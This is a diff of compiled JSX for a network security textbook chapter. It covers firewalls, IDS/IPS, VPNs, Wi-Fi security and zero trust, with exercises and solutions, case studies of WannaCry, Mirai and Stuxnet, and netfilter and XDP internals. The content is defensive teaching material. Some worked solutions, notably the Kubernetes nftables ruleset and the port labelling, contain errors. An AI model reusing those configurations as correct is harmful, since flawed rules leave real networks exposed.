+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "IDS/IPS:"
+        }), " Signature-based detects known attacks; anomaly-based detects zero-days; IPS blocks inline while IDS alerts"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "VPNs:"
+        }), " IPsec (enterprise site-to-site), WireGuard (modern, fast, minimal), OpenVPN (flexible, compatible)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Network Segmentation:"
+        }), " VLANs (Layer 2 isolation), DMZ (buffer zone), micro-segmentation (per-workload default-deny)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Protocol Security:"
+        }), " DNSSEC (signed DNS), DHCP snooping, BGP RPKI, SNMPv3 with auth+privacy"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Wireless Security:"
+        }), " WPA3 with SAE defeats offline brute-force, 802.1X/EAP-TLS for enterprise, OWE for public Wi-Fi"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "NAC:"
+        }), " 802.1X with posture assessment, quarantine non-compliant devices"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "DDoS:"
+        }), " Rate limiting, SYN cookies, Anycast CDN, Cloud scrubbing"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Zero Trust:"
+        }), " Never trust, always verify → identity-driven, micro-segmented, encrypted-everywhere"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Case Studies:"
+        }), " WannaCry (SMB exploit + worm propagation + kill switch), Mirai (IoT default creds + massive DDoS), Stuxnet (4 zero-days + air-gap breach + PLC sabotage)"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "exercises",
+      children: "Exercises"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "review-questions",
+      children: "Review Questions"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "At which OSI layer does a stateful firewall maintain state information?"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nLayer 4 (Transport). A stateful firewall tracks TCP connection state (SYN, SYN-ACK, ACK, FIN, RST) and UDP pseudo-state using a connection table. It makes filtering decisions based on the state of the connection, not just individual packets.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "2",
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "What is the primary weakness of signature-based IDS? How does anomaly-based IDS address it?"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nSignature-based IDS cannot detect novel (zero-day) attacks — it only matches known patterns. Anomaly-based IDS establishes a baseline of normal traffic and flags deviations, enabling detection of unknown attacks. However, anomaly-based has higher false positive rates.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "3",
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Explain how WPA3 SAE prevents offline dictionary attacks against Wi-Fi passwords."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nWPA3 SAE (Simultaneous Authentication of Equals) uses a zero-knowledge proof (Dragonfly handshake). Both parties prove knowledge of the password without revealing it. An attacker cannot capture the handshake and crack the password offline — each guess requires interaction with the real AP.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "4",
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "What is the difference between a VPN tunnel mode and transport mode?"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nTransport mode encrypts only the payload (L4+), keeping the original IP header visible — used for end-to-end (host-to-host). Tunnel mode encrypts the entire original IP packet and encapsulates it in a new IP header — used for site-to-site (gateway-to-gateway) VPNs.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "5",
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "How does ARP spoofing work? List three detection/prevention techniques."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nARP spoofing: attacker sends forged ARP replies, associating their MAC with the gateway's IP, intercepting traffic. Detection: 1) ARPwatch (monitors IP-MAC changes), 2) Dynamic ARP Inspection (DAI) on switches, 3) Static ARP entries for critical devices.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "6",
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "What is the role of RPKI in BGP security?"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nResource Public Key Infrastructure (RPKI) uses digitally signed route origin authorizations (ROAs) to verify that an AS is authorized to advertise specific IP prefixes. This prevents BGP hijacking by allowing routers to reject invalid route announcements.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "7",
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "How does micro-segmentation implement zero trust at the workload level?"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nMicro-segmentation divides the network into isolated zones at the workload level (per-VM, per-container, per-pod). Each workload has a whitelist of allowed connections. In Kubernetes, Network Policies enforce this — default-deny ingress/egress with allow rules based on labels, namespaces, and ports.\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "application-problems",
+      children: "Application Problems"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Design an iptables firewall for a DMZ web server that allows: HTTP/HTTPS from internet, SSH from 10.0.0.0/24 only, MySQL from 10.0.1.0/24 only, blocks all other inbound traffic, allows established/related, and logs all dropped packets."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\n```\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\niptables -A INPUT -p tcp -s 10.0.0.0/24 --dport 22 -j ACCEPT\niptables -A INPUT -p tcp -s 10.0.1.0/24 --dport 3306 -j ACCEPT\niptables -A INPUT -j LOG --log-prefix \"Dropped: \"\niptables -A INPUT -j DROP\n```\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "2",
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "You are configuring WPA3-Enterprise for a 500-employee company. Design the authentication infrastructure, including 802.1X, RADIUS server, PKI, and client configuration."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nDeploy FreeRADIUS or Microsoft NPS as the RADIUS server. Set up a PKI (AD CS or Step CA) to issue server and client certificates. Configure APs to use WPA3-Enterprise with 802.1X/EAP-TLS. Push client certificates via MDM. Optionally use EAP-TTLS/PAP as fallback with strong passwords + MFA.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "3",
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Your company is experiencing a DDoS attack (20,000 requests/second to the login page from random IPs). Design a multi-layer mitigation strategy."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nLayer 1: ISP-side scrubbing (Cloudflare/AWS Shield) to filter volumetric attacks. Layer 2: WAF rate limiting (200 req/min/IP to login). Layer 3: Challenge-based mitigation (JS challenge or CAPTCHA for suspicious IPs). Layer 4: Application-level queuing and connection limiting. Layer 5: Auto-scaling to absorb traffic.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "4",
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "A branch office needs to connect to HQ over the internet with encrypted site-to-site connectivity. Compare IPsec, WireGuard, and OpenVPN for this purpose and make a recommendation."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nWireGuard is recommended for modern site-to-site: faster (kernel-level, ~4k lines of code), simpler config, built-in roaming, ChaCha20-Poly1305 encryption. IPsec is mature but complex (IKEv2, multiple RFCs). OpenVPN is flexible but slower (userspace). For branch-to-HQ, WireGuard with pre-shared keys offers the best performance/security ratio.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "5",
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Given a network with multiple VLANs (Management 10, Users 20, Servers 30, DMZ 40), design firewall rules that enforce: users can access internet and servers on port 80/443, servers can access DMZ database on port 3306, DMZ cannot initiate connections to internal networks, management can SSH to all zones."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\n```\nVLAN 20 → Internet: allow (NAT)\nVLAN 20 → VLAN 30: allow tcp/80,443\nVLAN 30 → VLAN 40: allow tcp/3306\nVLAN 40 → VLAN *: deny all (DMZ cannot initiate)\nVLAN 10 → VLAN 20,30,40: allow tcp/22\nDefault: deny all inter-VLAN\n```\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "case-study-analysis",
+      children: "Case Study Analysis"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "WannaCry:"
+        }), " A hospital with a flat network. An employee plugs in an infected USB. Trace the infection path and identify the network architectural changes needed to prevent recurrence."]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nWannaCry spreads via EternalBlue (SMBv1 exploit) and DoublePulsar backdoor. On a flat network: infected USB → workstation → SMB scan → other workstations → servers. Mitigation: segment network into VLANs (clinical, admin, IoT), block SMBv1 at firewalls, enforce 802.1X for device authentication, disable unnecessary USB ports.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "2",
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Mirai:"
+        }), " A manufacturing plant has 500 IoT sensors on the same VLAN as the production servers. Design a network segmentation strategy that isolates IoT devices while maintaining necessary communication."]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nCreate IoT VLAN with default-deny ACLs. Only allow outbound traffic to specific management server IPs/ports. Production servers in separate VLAN with strict ingress rules from IoT VLAN. Use a bastion/jump host for admin access to IoT devices. Apply rate limiting per IoT device to prevent DDoS amplification.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "3",
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Stuxnet:"
+        }), " An air-gapped SCADA network for a chemical plant. Propose a security architecture that protects against USB-borne threats without compromising operational requirements."]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nMultiple layers: 1) USB scanning station — all removable media must pass through an air-gapped scanning kiosk. 2) Data diode for unidirectional gateway from IT to OT (no return path). 3) Application whitelisting on SCADA hosts (only approved executables run). 4) Full disk encryption with TPM attestation. 5) Honeypot devices to detect scanning activity.\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "challenge-problems",
+      children: "Challenge Problems"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Design a zero-trust architecture for a cloud-native company with 200 microservices, 50 employees, and AWS infrastructure. Include: identity provider, service mesh, network policies, device trust, and monitoring."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\nIdP: Keycloak/OIDC for user auth. Service mesh: Istio with mTLS (STRICT mode) for service-to-service. Network policies: Kubernetes NetworkPolicy with default-deny, allow by label. Device trust: osquery + FleetDM for endpoint telemetry, compliance checks. Monitoring: OPA/Rego for policy evaluation, Falco for runtime detection. All access authenticated and authorized per request.\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      start: "2",
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Write a complete set of nftables rules for a Kubernetes node that: blocks all inbound traffic except kubelet API (6443), allows pod-to-pod traffic (10.42.0.0/16), allows cluster-to-external traffic, logs dropped packets, and prevents IP spoofing from pods."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\n```\ntable inet filter {\n  chain input { type filter hook input priority 0;\n    tcp dport 6443 accept\n    ip saddr 10.42.0.0/16 accept\n    ct state established,related accept\n    log prefix \"nftables-drop: \" drop\n  }\n  chain forward { type filter hook forward priority 0;\n    ip saddr 10.42.0.0/16 accept\n    ip daddr 10.42.0.0/16 accept\n    ct state established,related accept\n    ip saddr != 10.42.0.0/24 drop\n    log prefix \"nftables-fwd-drop: \" drop\n  }\n}\n```\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "references",
+      children: "References"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "NIST SP 800-207: Zero Trust Architecture"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "NIST SP 800-41 Rev 1: Guidelines on Firewalls and Firewall Policy"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "OWASP: Web Application Firewall Evaluation Criteria"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "CVE-2017-0144 (EternalBlue): Microsoft SMBv1 Remote Code Execution"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "CVE-2017-13077 (KRACK): Key Reinstallation Attacks"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "RFC 8446: TLS 1.3"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "RFC 8110: Opportunistic Wireless Encryption (OWE)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "ZMap/Mirai: Understanding the Mirai Botnet (USENIX Security 2017)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Snake in the Grass: Stuxnet Analysis (Langner 2013)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h1, {
+      id: "chapter-3-continued-network-security--advanced-topics",
+      children: "Chapter 3 Continued: Network Security → Advanced Topics"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.blockquote, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
+        children: "This section extends Chapter 3 with deeper protocol analysis, additional practical examples, and extended interview preparation."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-17-advanced-firewall-internals",
+      children: "Section 17: Advanced Firewall Internals"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "171-netfilter-hooks-linux-kernel",
+      children: "17.1 Netfilter Hooks (Linux Kernel)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Linux netfilter provides five hook points in the kernel networking stack:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "         LOCAL_IN → INPUT chain\n            ↑\n[NF_INET_PRE_ROUTING] → FORWARD → [NF_INET_POST_ROUTING]\n            ↓                              ↑\n           LOCAL_OUT ← OUTPUT chain\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Hook Points:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Hook"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Trigger"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Chain Direction"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "NF_INET_PRE_ROUTING"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "First packet arrival"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "PREROUTING (nat/mangle)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "NF_INET_LOCAL_IN"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Packet destined for local host"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "INPUT (filter)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "NF_INET_FORWARD"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Packet routed through host"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "FORWARD (filter)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "NF_INET_LOCAL_OUT"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Packet generated locally"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "OUTPUT (filter)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "NF_INET_POST_ROUTING"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Packet leaving host"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "POSTROUTING (nat/mangle)"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "nftables chain types map to these hooks:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# INPUT chain hooks NF_INET_LOCAL_IN\ntable inet filter {\n    chain input {\n        type filter hook input priority 0;\n    }\n}\n\n# FORWARD chain hooks NF_INET_FORWARD\ntable inet filter {\n    chain forward {\n        type filter hook forward priority 0;\n    }\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "172-connection-tracking-internals",
+      children: "17.2 Connection Tracking Internals"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: ["The conntrack subsystem tracks ", (0,jsx_runtime.jsx)(_components.code, {
+        children: "struct nf_conn"
+      }), " entries in a hash table."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "struct nf_conn {\n    struct nf_conntrack_tuple_hash tuplehash[IP_CT_DIR_MAX]; // original + reply\n    struct nf_conntrack_proto proto;                         // TCP/UDP/ICMP state\n    struct nf_conn_help *help;                               // ALG helpers (FTP, SIP)\n    u_int32_t status;                                        // IPS_SEEN_REPLY, IPS_ASSURED\n    u_int32_t timeout;                                       // per-protocol timeout\n    struct timer_list timer;                                  // garbage collection\n};\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Connection States (TCP conntrack):"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "State"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Description"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Timeout (default)"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "NEW"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SYN seen, no reply yet"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "120s"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "ESTABLISHED"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SYN-ACK seen (reply direction)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "432000s (5 days)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "RELATED"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ICMP error for existing connection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "120s"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "INVALID"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Packets fail checksum/sequence"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "0s (immediate drop)"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Sequence Diagram:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Client (10.0.0.5:50000)          Server (93.184.216.34:80)\n         │                              │\n         │ ── SYN (seq=1000) ──────────→│  NEW (timeout=120s)\n         │                              │\n         │ ←─ SYN-ACK (seq=2000, ack=1001) ───│  ESTABLISHED (timeout=432000s)\n         │                              │\n         │ ── ACK (seq=1001, ack=2001) ─→│  ESTABLISHED, ASSURED\n         │                              │\n         │ ── HTTP GET / ──────────────→│  ESTABLISHED\n         │                              │\n         │ ←─ HTTP 200 OK (data) ───────│  ESTABLISHED\n         │                              │\n         │ ── FIN (seq=2001) ──────────→│  CLOSE_WAIT (timeout=120s)\n         │ ←─ FIN-ACK ─────────────────│  LAST_ACK\n         │ ── ACK ─────────────────────→│  TIME_WAIT (2MSL) → removed\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "173-bpf-based-firewalls-ebpfxdp",
+      children: "17.3 BPF-based Firewalls (eBPF/XDP)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Modern firewalls use eBPF at the XDP (eXpress Data Path) hook, which runs before skb allocation → the fastest possible packet processing:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-c",
+        children: "// XDP program example (drop all traffic from specific subnet)\nSEC(\"xdp_drop\")\nint xdp_drop_prog(struct xdp_md *ctx) {\n    void *data = (void *)(long)ctx->data;\n    void *data_end = (void *)(long)ctx->data_end;\n    \n    struct ethhdr *eth = data;\n    if (data + sizeof(*eth) > data_end)\n        return XDP_ABORTED;\n    \n    if (bpf_ntohs(eth->h_proto) == ETH_P_IP) {\n        struct iphdr *ip = data + sizeof(*eth);\n        if (data + sizeof(*eth) + sizeof(*ip) > data_end)\n            return XDP_ABORTED;\n        \n        if (ip->saddr == 0x0100000A) { // 10.0.0.1\n            return XDP_DROP;\n        }\n    }\n    return XDP_PASS;\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Load the program:"
+      }), " ", (0,jsx_runtime.jsx)(_components.code, {
+        children: "ip link set dev eth0 xdp obj drop.o sec xdp_drop"
+      }), "\n", (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Performance:"
+      }), " 10-20 million packets per second per core (vs iptables ~1-2 Mpps)"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-18-advanced-idsips--deep-dive",
+      children: "Section 18: Advanced IDS/IPS → Deep Dive"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "181-suricata-multi-threading-architecture",
+      children: "18.1 Suricata Multi-Threading Architecture"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Suricata uses a \"runmode\" packet processing pipeline:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "[Packet Capture] → [Decode] → [Stream TCP] → [Detect] → [Output]\n                                        ↑\n                                  [App Layer Parser]\n                                  (HTTP, DNS, TLS, SMB, etc.)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Runmodes:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "autofp"
+        }), " (default): Multiple capture threads, 1 detect thread per NIC RSS queue"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "workers"
+        }), ": 1 thread handles capture + decode + detect per CPU"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "af-packet"
+        }), ": Fanout to multiple kernel sockets for zero-copy"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Performance tuning:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-yaml",
+        children: "# suricata.yaml\nthreading:\n  set-cpu-affinity: yes\n  cpu-affinity:\n    - management-cpu-set:\n        cpu: [0]\n    - receive-cpu-set:\n        cpu: [1, 2, 3, 4]\n    - worker-cpu-set:\n        cpu: [5, 6, 7, 8]  # one per RSS queue\n  detect-thread-ratio: 1.0  # one detect thread per worker\n\n# Bypass kernel TCP stack for known-good traffic\nflow_bypass: yes\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "182-pcre-rules--advanced-pattern-matching",
+      children: "18.2 PCRE Rules → Advanced Pattern Matching"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Suricata/Snort use PCRE (Perl Compatible Regular Expressions) for complex pattern matching:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
